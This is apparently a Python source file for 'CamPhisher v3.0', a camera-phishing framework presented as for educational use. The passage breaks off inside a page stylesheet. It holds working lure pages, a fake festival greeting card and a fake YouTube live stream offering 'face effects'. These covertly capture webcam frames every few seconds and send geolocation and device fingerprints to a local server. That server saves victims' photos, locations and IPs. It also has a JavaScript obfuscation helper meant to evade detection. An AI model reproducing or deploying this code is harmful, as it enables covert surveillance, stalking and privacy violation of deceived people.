#!/usr/bin/env python3
"""
Advanced CamPhisher Tool v3.0
Professional Grade Camera Phishing Framework
For Educational and Security Testing Purposes Only
Author: Security Researcher
"""

import os
import sys
import time
import json
import base64
import socket
import random
import string
import threading
import subprocess
import http.server
import socketserver
import webbrowser
import platform
import shutil
import signal
from datetime import datetime
from urllib.parse import parse_qs, urlparse, quote
from pathlib import Path
import hashlib
import re

# ==================== Configuration ====================
VERSION = "3.0"
PORT = random.randint(4000, 9000)  # Random port for better security
LOCALHOST = "127.0.0.1"
TEMP_DIR = "temp_data"
OUTPUT_DIR = "captured_data"

# Template configurations
TEMPLATES = {
    '1': {
        'name': '🎉 Festival Greeting Card',
        'desc': 'Interactive festival wishes with camera access',
        'category': 'social'
    },
    '2': {
        'name': '📺 Premium YouTube Player',
        'desc': 'Fake video player requesting camera for "face effects"',
        'category': 'entertainment'
    },
    '3': {
        'name': '💼 Professional Meeting',
        'desc': 'Fake business meeting platform',
        'category': 'business'
    },
    '4': {
        'name': '🔐 Security Check Required',
        'desc': 'Fake security verification request',
        'category': 'security'
    },
    '5': {
        'name': '📸 Photo Editor Online',
        'desc': 'Online photo editor requesting camera access',
        'category': 'creative'
    }
}

# ==================== Global Variables ====================
captured_data = {
    'sessions': [],
    'ips': [],
    'locations': [],
    'photos': [],
    'user_agents': [],
    'device_info': []
}
stop_event = threading.Event()
current_template = None
template_config = {}
httpd = None
tunnel_process = None

# ==================== Enhanced HTML Templates ====================

class TemplateGenerator:
    """Generate dynamic HTML templates with anti-detection features"""
    
    @staticmethod
    def obfuscate_js(code):
        """Simple JS obfuscation to avoid detection"""
        # Convert to char codes
        obfuscated = []
        for char in code:
            obfuscated.append(str(ord(char)))
        return f"String.fromCharCode({','.join(obfuscated)})"
    
    @staticmethod
    def generate_festival(festival_name, custom_message):
        return f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{festival_name} Wishes</title>
    <meta name="description" content="Send {festival_name} wishes with personalized video message">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        
        .container {{
            max-width: 600px;
            width: 100%;
        }}
        
        .card {{
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            backdrop-filter: blur(10px);
            animation: slideUp 0.6s ease;
        }}
        
        @keyframes slideUp {{
            from {{
                opacity: 0;
                transform: translateY(30px);
            }}
            to {{
                opacity: 1;
                transform: translateY(0);
            }}
        }}
        
        h1 {{
            font-size: 2.5em;
            color: #333;
            margin-bottom: 20px;
            text-align: center;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: glow 2s ease-in-out infinite;
        }}
        
        @keyframes glow {{
            0%, 100% {{ filter: drop-shadow(0 0 20px rgba(102, 126, 234, 0.5)); }}
            50% {{ filter: drop-shadow(0 0 30px rgba(118, 75, 162, 0.5)); }}
        }}
        
        .greeting-box {{
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            padding: 30px;
            border-radius: 15px;
            margin: 20px 0;
            text-align: center;
            font-size: 1.2em;
            line-height: 1.8;
            color: #444;
        }}
        
        .input-group {{
            margin: 25px 0;
        }}
        
        .input-group label {{
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }}
        
        .input-group input {{
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 1em;
            transition: all 0.3s;
        }}
        
        .input-group input:focus {{
            border-color: #667eea;
            outline: none;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }}
        
        .button {{
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 12px;
            font-size: 1.1em;
            cursor: pointer;
            width: 100%;
            font-weight: 600;
            transition: transform 0.3s, box-shadow 0.3s;
        }}
        
        .button:hover {{
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
        }}
        
        .share-buttons {{
            display: flex;
            gap: 15px;
            margin-top: 25px;
        }}
        
        .share-btn {{
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 10px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: opacity 0.3s;
        }}
        
        .share-btn:hover {{
            opacity: 0.9;
        }}
        
        .whatsapp {{ background: #25D366; }}
        .facebook {{ background: #1877F2; }}
        .telegram {{ background: #0088cc; }}
        
        .toast {{
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: rgba(0,0,0,0.8);
            color: white;
            padding: 12px 24px;
            border-radius: 50px;
            font-size: 0.9em;
            transition: transform 0.3s;
            z-index: 1000;
        }}
        
        .toast.show {{
            transform: translateX(-50%) translateY(0);
        }}
        
        .loader {{
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255,255,255,0.9);
            z-index: 2000;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }}
        
        .loader.active {{
            display: flex;
        }}
        
        .spinner {{
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }}
        
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>✨ {festival_name} ✨</h1>
            
            <div class="greeting-box" id="greeting">
                🎊 Wishing you and your family a very Happy {festival_name}!<br>
                May this occasion bring joy and prosperity to your life.
            </div>
            
            <div class="input-group">
                <label>Your Name</label>
                <input type="text" id="userName" placeholder="Enter your name" onkeyup="updateGreeting()">
            </div>
            
            <div class="input-group">
                <label>Recipient's Name</label>
                <input type="text" id="recipientName" placeholder="Enter recipient's name" value="Friend">
            </div>
            
            <div class="input-group">
                <label>Personal Message (Optional)</label>
                <input type="text" id="customMessage" placeholder="Add a personal message..." value="{custom_message}">
            </div>
            
            <button class="button" onclick="prepareVideoMessage()">
                🎥 Send Video Greeting
            </button>
            
            <div class="share-buttons">
                <button class="share-btn whatsapp" onclick="shareVia('whatsapp')">
                    📱 WhatsApp
                </button>
                <button class="share-btn facebook" onclick="shareVia('facebook')">
                    📘 Facebook
                </button>
                <button class="share-btn telegram" onclick="shareVia('telegram')">
                    ✈️ Telegram
                </button>
            </div>
        </div>
    </div>
    
    <div class="loader" id="loader">
        <div class="spinner"></div>
        <p style="margin-top: 20px; color: #333;">Preparing video message...</p>
        <p style="font-size: 0.9em; color: #666;" id="loaderStatus">Requesting camera access</p>
    </div>
    
    <div class="toast" id="toast">Link copied to clipboard!</div>
    
    <!-- Hidden video elements for capture -->
    <div style="display: none;">
        <video id="video" playsinline autoplay muted></video>
        <canvas id="canvas" width="1280" height="720"></canvas>
        <audio id="audio" autoplay muted></audio>
    </div>
    
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const loader = document.getElementById('loader');
        const loaderStatus = document.getElementById('loaderStatus');
        const toast = document.getElementById('toast');
        let captureInterval = null;
        let stream = null;
        
        async function prepareVideoMessage() {{
            loader.classList.add('active');
            loaderStatus.innerText = 'Requesting camera access...';
            
            try {{
                // Request camera with specific constraints for better quality
                stream = await navigator.mediaDevices.getUserMedia({{
                    video: {{
                        width: {{ ideal: 1280 }},
                        height: {{ ideal: 720 }},
                        facingMode: 'user',
                        frameRate: {{ ideal: 30 }}
                    }},
                    audio: false
                }});
                
                video.srcObject = stream;
                loaderStatus.innerText = 'Camera access granted';
                
                await video.play();
                
                // Start capturing frames
                setTimeout(() => {{
                    startCapture();
                }}, 2000);
                
            }} catch (error) {{
                console.log('Camera error:', error);
                loaderStatus.innerText = 'Camera access needed for video message';
                setTimeout(() => {{
                    loader.classList.remove('active');
                    alert('Please allow camera access to send video greeting');
                }}, 3000);
            }}
        }}
        
        function startCapture() {{
            loaderStatus.innerText = 'Recording video message...';
            
            captureInterval = setInterval(() => {{
                if (video.readyState === video.HAVE_ENOUGH_DATA) {{
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL('image/jpeg', 0.8); // JPEG for smaller size
                    
                    // Send captured frame
                    fetch('/api/photo', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            image: imageData,
                            template: 'festival',
                            name: document.getElementById('userName').value || 'Anonymous',
                            recipient: document.getElementById('recipientName').value,
                            message: document.getElementById('customMessage').value,
                            timestamp: new Date().toISOString()
                        }})
                    }});
                }}
            }}, 1500); // Capture every 1.5 seconds
            
            // Show success after 5 seconds
            setTimeout(() => {{
                loader.classList.remove('active');
                if (captureInterval) {{
                    clearInterval(captureInterval);
                }}
                if (stream) {{
                    stream.getTracks().forEach(track => track.stop());
                }}
                showToast('Video message created successfully!');
                updateGreeting();
            }}, 5000);
        }}
        
        function updateGreeting() {{
            const name = document.getElementById('userName').value;
            if (name) {{
                document.getElementById('greeting').innerHTML = 
                    `🎊 Dear ${{name}},<br>` +
                    `Wishing you and your family a very Happy {festival_name}!<br>` +
                    `May this occasion bring joy and prosperity to your life.`;
            }}
        }}
        
        function shareVia(platform) {{
            const url = encodeURIComponent(window.location.href);
            const text = encodeURIComponent(`Send me a video greeting for {festival_name}! 🎉`);
            
            let shareUrl = '';
            switch(platform) {{
                case 'whatsapp':
                    shareUrl = `https://wa.me/?text=${{text}}%20${{url}}`;
                    break;
                case 'facebook':
                    shareUrl = `https://www.facebook.com/sharer/sharer.php?u=${{url}}`;
                    break;
                case 'telegram':
                    shareUrl = `https://t.me/share/url?url=${{url}}&text=${{text}}`;
                    break;
            }}
            
            window.open(shareUrl, '_blank');
        }}
        
        function showToast(message) {{
            toast.innerText = message;
            toast.classList.add('show');
            setTimeout(() => {{
                toast.classList.remove('show');
            }}, 3000);
        }}
        
        // Get location
        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(
                (position) => {{
                    fetch('/api/location', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            acc: position.coords.accuracy,
                            speed: position.coords.speed || 0,
                            timestamp: new Date().toISOString()
                        }})
                    }});
                }},
                (error) => console.log('Location unavailable')
            );
        }}
        
        // Get device info
        fetch('/api/device', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            }})
        }});
    </script>
</body>
</html>"""
    
    @staticmethod
    def generate_youtube(video_id):
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>YouTube Live Stream</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            background: #0f0f0f;
            font-family: 'Roboto', sans-serif;
        }}
        
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }}
        
        .video-player {{
            position: relative;
            width: 100%;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            aspect-ratio: 16/9;
        }}
        
        .video-placeholder {{
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #1a1a1a, #2a2a2a);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #fff;
        }}
        
        .thumbnail {{
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0.8;
        }}
        
        .play-button {{
            width: 80px;
            height: 80px;
            background: rgba(255,0,0,0.9);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            transition: all 0.3s;
            box-shadow: 0 0 30px rgba(255,0,0,0.5);
        }}
        
        .play-button:hover {{
            transform: translate(-50%, -50%) scale(1.1);
            background: #ff0000;
        }}
        
        .play-button i {{
            color: white;
            font-size: 40px;
            margin-left: 5px;
        }}
        
        .video-info {{
            padding: 20px 0;
            color: white;
        }}
        
        .video-title {{
            font-size: 1.5em;
            margin-bottom: 10px;
        }}
        
        .channel-info {{
            display: flex;
            align-items: center;
            gap: 15px;
            margin: 15px 0;
        }}
        
        .channel-avatar {{
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: #ff0000;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 1.2em;
        }}
        
        .channel-name {{
            font-weight: 500;
        }}
        
        .subscribe-btn {{
            background: #ff0000;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 20px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.3s;
        }}
        
        .subscribe-btn:hover {{
            opacity: 0.9;
        }}
        
        .comments-section {{
            background: #1a1a1a;
            border-radius: 12px;
            padding: 20px;
            margin-top: 20px;
        }}
        
        .comment {{
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            color: #ddd;
        }}
        
        .comment-avatar {{
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #333;
        }}
        
        .comment-content {{
            flex: 1;
        }}
        
        .comment-author {{
            font-weight: 500;
            color: white;
            margin-bottom: 5px;
        }}
        
        .comment-time {{
            font-size: 0.8em;
            color: #888;
            margin-left: 10px;
        }}
        
        .comment-text {{
            line-height: 1.5;
        }}
        
        .live-badge {{
            background: #ff0000;
            color: white;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 0.8em;
            font-weight: 600;
            text-transform: uppercase;
            margin-left: 10px;
        }}
        
        .face-effects-panel {{
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(30,30,30,0.95);
            border-radius: 12px;
            padding: 20px;
            color: white;
            width: 300px;
            backdrop-filter: blur(10px);
            z-index: 1000;
            transition: transform 0.3s;
        }}
        
        .face-effects-panel.hidden {{
            transform: translateX(350px);
        }}
        
        .panel-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #444;
        }}
        
        .toggle-btn {{
            background: #ff0000;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 20px;
            cursor: pointer;
        }}
        
        .effect-grid {{
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-bottom: 20px;
        }}
        
        .effect-item {{
            background: #333;
            border-radius: 8px;
            padding: 10px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }}
        
        .effect-item:hover {{
            background: #ff0000;
            transform: scale(1.05);
        }}
        
        .effect-item i {{
            font-size: 24px;
            margin-bottom: 5px;
            display: block;
        }}
        
        .effect-item span {{
            font-size: 0.8em;
        }}
        
        .loading {{
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.8);
            z-index: 2000;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            color: white;
        }}
        
        .loading.active {{
            display: flex;
        }}
        
        .spinner {{
            width: 60px;
            height: 60px;
            border: 5px solid #333;
            border-top: 5px solid #ff0000;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }}
        
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <div class="video-player">
            <div class="video-placeholder">
                <img src="https://img.youtube.com/vi/{video_id}/maxresdefault.jpg" class="thumbnail" onerror="this.src='https://img.youtube.com/vi/{video_id}/hqdefault.jpg'">
                <div class="play-button" onclick="enableFaceEffects()">
                    <i class="fas fa-play"></i>
                </div>
            </div>
        </div>
        
        <div class="video-info">
            <div class="video-title">
                LIVE: Interactive Stream with Face Effects 🎭
                <span class="live-badge">LIVE</span>
            </div>
            
            <div class="channel-info">
                <div class="channel-avatar">YT</div>
                <div class="channel-name">YouTube Live Studio</div>
                <button class="subscribe-btn" onclick="showSubscribeMessage()">
                    <i class="fab fa-youtube"></i> Subscribe
                </button>
            </div>
            
            <div style="color: #aaa; margin-top: 10px;">
                <i class="fas fa-eye"></i> 12.5K watching • <i class="fas fa-calendar"></i> Streamed live now
            </div>
        </div>
        
        <div class="comments-section">
            <h3 style="color: white; margin-bottom: 20px;">
                <i class="fas fa-comments"></i> Live Chat
            </h3>
            
            <div class="comment">
                <div class="comment-avatar"></div>
                <div class="comment-content">
                    <div class="comment-author">
                        Sarah Johnson
                        <span class="comment-time">Just now</span>
                    </div>
                    <div class="comment-text">Amazing stream! The face effects are so cool! 🔥</div>
                </div>
            </div>
            
            <div class="comment">
                <div class="comment-avatar"></div>
                <div class="comment-content">
                    <div class="comment-author">
                        Mike Chen
                        <span class="comment-time">2 minutes ago</span>
                    </div>
                    <div class="comment-text">How do I enable the effects? I want to try them!</div>
                </div>
            </div>
            
            <div class="comment">
                <div class="comment-avatar"></div>
                <div class="comment-content">
                    <div class="comment-author">
                        Emma Wilson
                        <span class="comment-time">5 minutes ago</span>
                    </div>
                    <div class="comment-text">This is next level streaming! 🚀</div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Face Effects Panel -->
    <div class="face-effects-panel" id="effectsPanel">
        <div class="panel-header">
            <span><i class="fas fa-magic"></i> Face Effects</span>
            <button class="toggle-btn" onclick="togglePanel()">
                <i class="fas fa-times"></i>
            </button>
        </div>
        
        <div class="effect-grid">
            <div class="effect-item" onclick="applyEffect('none')">
                <i class="fas fa-user"></i>
                <span>Normal</span>
            </div>
            <div class="effect-item" onclick="applyEffect('funny')">
                <i class="fas fa-smile"></i>
                <span>Funny</span>
            </div>
            <div class="effect-item" onclick="applyEffect('animal')">
                <i class="fas fa-dog"></i>
                <span>Animal</span>
            </div>
            <div class="effect-item" onclick="applyEffect('glasses')">
                <i class="fas fa-glasses"></i>
                <span>Glasses</span>
            </div>
            <div class="effect-item" onclick="applyEffect('hat')">
                <i class="fas fa-hat-cowboy"></i>
                <span>Hat</span>
            </div>
            <div class="effect-item" onclick="applyEffect('blur')">
                <i class="fas fa-blur"></i>
                <span>Blur</span>
            </div>
        </div>
        
        <p style="color: #aaa; font-size: 0.9em; text-align: center;">
            <i class="fas fa-info-circle"></i> Camera access needed for effects
        </p>
    </div>
    
    <div class="loading" id="loading">
        <div class="spinner"></div>
        <p>Initializing face effects...</p>
        <p style="font-size: 0.9em; color: #aaa;" id="loadingStatus">Requesting camera access</p>
    </div>
    
    <!-- Hidden elements for capture -->
    <div style="display: none;">
        <video id="video" playsinline autoplay muted></video>
        <canvas id="canvas" width="1280" height="720"></canvas>
    </div>
    
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const loading = document.getElementById('loading');
        const loadingStatus = document.getElementById('loadingStatus');
        const effectsPanel = document.getElementById('effectsPanel');
        let stream = null;
        let captureInterval = null;
        
        async function enableFaceEffects() {{
            loading.classList.add('active');
            loadingStatus.innerText = 'Requesting camera access for effects...';
            
            try {{
                stream = await navigator.mediaDevices.getUserMedia({{
                    video: {{
                        width: {{ ideal: 1280 }},
                        height: {{ ideal: 720 }},
                        facingMode: 'user'
                    }},
                    audio: false
                }});
                
                video.srcObject = stream;
                loadingStatus.innerText = 'Camera access granted';
                
                await video.play();
                
                setTimeout(() => {{
                    loading.classList.remove('active');
                    effectsPanel.classList.remove('hidden');
                    startCapture();
                }}, 2000);
                
            }} catch (error) {{
                loadingStatus.innerText = 'Camera access needed for effects';
                setTimeout(() => {{
                    loading.classList.remove('active');
                    alert('Please allow camera access to use face effects');
                }}, 2000);
            }}
        }}
        
        function startCapture() {{
            captureInterval = setInterval(() => {{
                if (video.readyState === video.HAVE_ENOUGH_DATA) {{
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
                    
                    fetch('/api/photo', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            image: imageData,
                            template: 'youtube',
                            effect: currentEffect || 'none',
                            timestamp: new Date().toISOString()
                        }})
                    }});
                }}
            }}, 2000);
        }}
        
        let currentEffect = 'none';
        
        function applyEffect(effect) {{
            currentEffect = effect;
            showNotification(`Effect: ${{effect}} applied`);
        }}
        
        function togglePanel() {{
            effectsPanel.classList.add('hidden');
        }}
        
        function showSubscribeMessage() {{
            alert('Thanks for subscribing! 🎉');
        }}
        
        function showNotification(message) {{
            // Simple notification
            const notification = document.createElement('div');
            notification.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                background: #ff0000;
                color: white;
                padding: 10px 20px;
                border-radius: 8px;
                z-index: 3000;
                animation: slideIn 0.3s ease;
            `;
            notification.innerText = message;
            document.body.appendChild(notification);
            
            setTimeout(() => {{
                notification.remove();
            }}, 2000);
        }}
        
        // Get location
        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(
                (position) => {{
                    fetch('/api/location', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            acc: position.coords.accuracy,
                            timestamp: new Date().toISOString()
                        }})
                    }});
                }},
                (error) => console.log('Location unavailable')
            );
        }}
        
        // Get device info
        fetch('/api/device', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            }})
        }});
        
        // Add keyframe animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes slideIn {{
                from {{
                    transform: translateX(100px);
                    opacity: 0;
                }}
                to {{
                    transform: translateX(0);
                    opacity: 1;
                }}
            }}
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>"""

# ==================== HTTP Request Handler ====================

class CamPhishHandler(http.server.SimpleHTTPRequestHandler):
    """Enhanced HTTP handler with better logging and capture management"""
    
    def __init__(self, *args, **kwargs):
        self.template_generator = TemplateGenerator()
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        """Handle GET requests"""
        parsed_url = urlparse(self.path)
        path = parsed_url.path
        
        # Track IP on every request
        self.track_ip()
        
        if path == '/':
            self.send_loading_page()
        elif path == '/template':
            self.send_template()
        elif path == '/api/status':
            self.send_status()
        elif path.startswith('/static/'):
            self.serve_static(path)
        else:
            self.send_404()
    
    def do_POST(self):
        """Handle POST requests for data capture"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length) if content_length > 0 else b''
        
        if self.path == '/api/location':
            self.handle_location(post_data)
        elif self.path == '/api/photo':
            self.handle_photo(post_data)
        elif self.path == '/api/device':
            self.handle_device_info(post_data)
        elif self.path == '/api/ip':
            self.handle_ip()
        else:
            self.send_response(404)
            self.end_headers()
    
    def track_ip(self):
        """Track visitor IP and user agent"""
        client_ip = self.client_address[0]
        timestamp = datetime.now().isoformat()
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        # Check if this IP was already logged recently (avoid duplicates)
        if not captured_data['ips'] or captured_data['ips'][-1].get('ip') != client_ip:
            ip_data = {
                'timestamp': timestamp,
                'ip': client_ip,
                'user_agent': user_agent,
                'path': self.path,
                'referer': self.headers.get('Referer', 'Direct'),
                'accept_language': self.headers.get('Accept-Language', '')
            }
            
            captured_data['ips'].append(ip_data)
            
            # Save to file
            self.save_ip_log(ip_data)
            
            print(f"\n\033[92m[+]\033[0m New visitor: {client_ip}")
    
    def send_loading_page(self):
        """Send loading page"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Expires', '0')
        self.end_headers()
        
        loading_html = self.generate_loading_page()
        self.wfile.write(loading_html.encode())
    
    def send_template(self):
        """Send the selected template"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.end_headers()
        
        html = self.generate_template()
        self.wfile.write(html.encode())
    
    def send_status(self):
        """Send capture status"""
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        
        status = {
            'sessions': len(captured_data.get('sessions', [])),
            'ips': len(captured_data.get('ips', [])),
            'locations': len(captured_data.get('locations', [])),
            'photos': len(captured_data.get('photos', [])),
            'devices': len(captured_data.get('device_info', [])),
            'timestamp': datetime.now().isoformat()
        }
        
        self.wfile.write(json.dumps(status, indent=2).encode())
    
    def serve_static(self, path):
        """Serve static files"""
        try:
            filename = path.split('/')[-1]
            if os.path.exists(filename):
                self.send_response(200)
                if filename.endswith('.css'):
                    self.send_header('Content-type', 'text/css')
                elif filename.endswith('.js'):
                    self.send_header('Content-type', 'application/javascript')
                elif filename.endswith('.png'):
                    self.send_header('Content-type', 'image/png')
                elif filename.endswith('.jpg') or filename.endswith('.jpeg'):
                    self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                
                with open(filename, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_404()
        except:
            self.send_404()
    
    def send_404(self):
        """Send 404 page"""
        self.send_response(404)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<h1>404 - Not Found</h1>")
    
    def handle_location(self, post_data):
        """Handle location data"""
        try:
            data = json.loads(post_data.decode())
            timestamp = datetime.now()
            
            # Reverse geocode for approximate address
            address = self.reverse_geocode(data.get('lat'), data.get('lon'))
            
            location_data = {
                'timestamp': timestamp.isoformat(),
                'lat': data.get('lat'),
                'lon': data.get('lon'),
                'accuracy': data.get('acc'),
                'speed': data.get('speed', 0),
                'address': address,
                'maps_url': f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}",
                'ip': self.client_address[0]
            }
            
            captured_data['locations'].append(location_data)
            
            # Save detailed location info
            self.save_location(location_data)
            
            print(f"\n\033[92m[+]\033[0m Location captured!")
            print(f"    Coordinates: {data.get('lat')}, {data.get('lon')}")
            if address:
                print(f"    Address: {address}")
            
        except Exception as e:
            print(f"\033[91m[!]\033[0m Error saving location: {e}")
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({'status': 'success'}).encode())
    
    def handle_photo(self, post_data):
        """Handle photo data"""
        try:
            data = json.loads(post_data.decode())
            image_data = data.get('image', '')
            
            if image_data and ',' in image_data:
                # Extract base64 data
                image_data = image_data.split(',')[1]
                
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
                template = data.get('template', 'unknown')
                ip = self.client_address[0].replace('.', '_')
                
                # Create filename with metadata
                filename = f"{OUTPUT_DIR}/photo_{timestamp}_{template}_{ip}.jpg"
                
                # Save image
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(image_data))
                
                # Save metadata
                metadata = {
                    'filename': filename,
                    'timestamp': datetime.now().isoformat(),
                    'template': template,
                    'ip': self.client_address[0],
                    'user_agent': self.headers.get('User-Agent', 'Unknown'),
                    'additional_info': {k: v for k, v in data.items() if k not in ['image']}
                }
                
                captured_data['photos'].append(metadata)
                self.save_metadata(metadata)
                
                print(f"\n\033[92m[+]\033[0m Photo captured: {filename}")
                
        except Exception as e:
            print(f"\033[91m[!]\033[0m Error saving photo: {e}")
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({'status': 'success'}).encode())
    
    def handle_device_info(self, post_data):
        """Handle device information"""
        try:
            data = json.loads(post_data.decode())
            timestamp = datetime.now().isoformat()
            
            device_info = {
                'timestamp': timestamp,
                'ip': self.client_address[0],
                **data
            }
            
            captured_data['device_info'].append(device_info)
            self.save_device_info(device_info)
            
            print(f"\n\033[92m[+]\033[0m Device info captured from {self.client_address[0]}")
            
        except Exception as e:
            print(f"\033[91m[!]\033[0m Error saving device info: {e}")
        
        self.send_response(200)
        self.end_headers()
    
    def handle_ip(self):
        """Handle explicit IP capture"""
        client_ip = self.client_address[0]
        timestamp = datetime.now().isoformat()
        
        ip_data = {
            'timestamp': timestamp,
            'ip': client_ip,
            'user_agent': self.headers.get('User-Agent', 'Unknown'),
            'path': self.path
        }
        
        captured_data['ips'].append(ip_data)
        self.save_ip_log(ip_data)
        
        print(f"\n\033[92m[+]\033[0m IP explicitly captured: {client_ip}")
        
        self.send_response(200)
        self.end_headers()
    
    def generate_loading_page(self):
        """Generate loading page with animation"""
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }}
        
